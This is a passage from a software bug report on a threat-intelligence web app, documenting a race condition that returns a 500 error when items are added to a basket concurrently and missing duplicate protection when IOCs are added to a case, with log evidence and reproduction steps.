- **Evidence:** Reproduced 3 times independently: (1) isolated concurrent httpx POSTs from inside app-backend-1 -- first request 201 Created, second 500 Internal Server Error, full traceback captured: 'sqlalchemy.dialects.postgresql.asyncpg.AsyncAdapt_asyncpg_dbapi.IntegrityError: ... duplicate key value violates unique constraint "uq_basket_owner_ioc"'; (2) live two-tab simultaneous click in chaos-walkthrough.js scenario 3b (backend log: one 201, one 500 for ioc_value chaos-tworace-1786791027609.example.com); (3) clean isolated follow-up (chaos-followup.js Check B) for ioc_value chaos-cleanrace-1786791259641.example.com -- backend log shows '172.21.0.1:56676 - "POST /api/v1/basket HTTP/1.1" 500 Internal Server Error' with traceback pointing at 'File "/app/app/api/routes/basket.py", line 84, in add_to_basket' immediately followed by a 201 from the other tab. DB confirms no data corruption either time (exactly 1 basket_items row per value, thanks to the DB constraint) -- this is purely an unhandled-exception/reliability bug, not data loss.
- **Reproduction:** From two browser tabs logged in as the same account, both viewing a fresh (never-basketed) IOC's investigation page, click 'Add to Basket' in both tabs within the same ~100ms window. One tab gets 201, the other gets a raw 500 (backend log shows the IntegrityError traceback at basket.py:84).

- **Severity:** P2

- **Title:** 'Add to Case' has zero duplicate protection -- concurrent identical requests silently create duplicate IOC rows in the case
- **Description:** Unlike basket.py, `add_case_ioc` in backend/app/api/routes/cases.py performs no existing-row check at all and there is no unique constraint on CaseIOC (case_id, ioc_value). Two concurrent (or rapidly double-clicked) 'Add to Case' requests for the identical ioc_value both return 201 and both persist, leaving the case permanently showing the same IOC listed twice with no error and no warning to the analyst.
